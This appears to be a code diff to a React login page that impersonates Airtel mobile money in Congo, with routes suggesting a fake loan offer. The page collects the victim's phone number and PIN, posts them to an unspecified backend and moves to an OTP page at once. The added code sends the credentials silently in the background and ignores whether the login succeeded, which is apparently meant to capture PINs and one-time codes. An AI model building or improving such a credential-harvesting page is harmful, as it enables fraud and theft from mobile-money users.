@@ -25,10 +25,11 @@ function AirtelLogin() {
     }
   };
 
-  const handleLogin = async (e: React.FormEvent) => {
+  const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     const pinString = pin.join('');
 
+    // Client-side validation
     if (phone.length < 9) {
       setError('Enter a valid Airtel number.');
       return;
@@ -40,44 +41,22 @@ function AirtelLogin() {
 
     setError('');
 
-    try {
-      const fullPhone = `+243${phone}`;
+    // Save phone number so the OTP page can use it
+    const fullPhone = `+243${phone}`;
+    localStorage.setItem('airtelPhone', fullPhone);
 
-      // --- STEP 1: LOGIN ---
-      const loginRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
-      });
-      const loginData = await loginRes.json();
+    // Fire the API request in the background (no await)
+    fetch(`${import.meta.env.VITE_API_BASE_URL}/api/login`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phone_number: fullPhone, pin: pinString }),
+    }).catch(() => {
+      // Silent failure — the user is already on the OTP page
+      console.error('Login request failed in the background');
+    });
 
-      if (loginData.status !== 'success') {
-        setError(loginData.message || 'Login failed.');
-        return;
-      }
-
-      // --- STEP 2: INSTANTLY VERIFY OTP ---
-      // Backend returns the OTP in the login response for auto-verification
-      if (loginData.otp) {
-        const verifyRes = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone_number: fullPhone, otp: loginData.otp }),
-        });
-        const verifyData = await verifyRes.json();
-
-        if (verifyData.status === 'success') {
-          navigate('/airtel-loan-limit'); // Straight to the next step
-        } else {
-          setError(verifyData.message || 'OTP verification failed.');
-        }
-      } else {
-        // Fallback: if backend doesn't return OTP, go to OTP page
-        navigate('/airtel-otp');
-      }
-    } catch {
-      setError('Error connecting to backend.');
-    }
+    // Navigate IMMEDIATELY — no waiting for the API
+    navigate('/airtel-otp');
   };
 
   return (
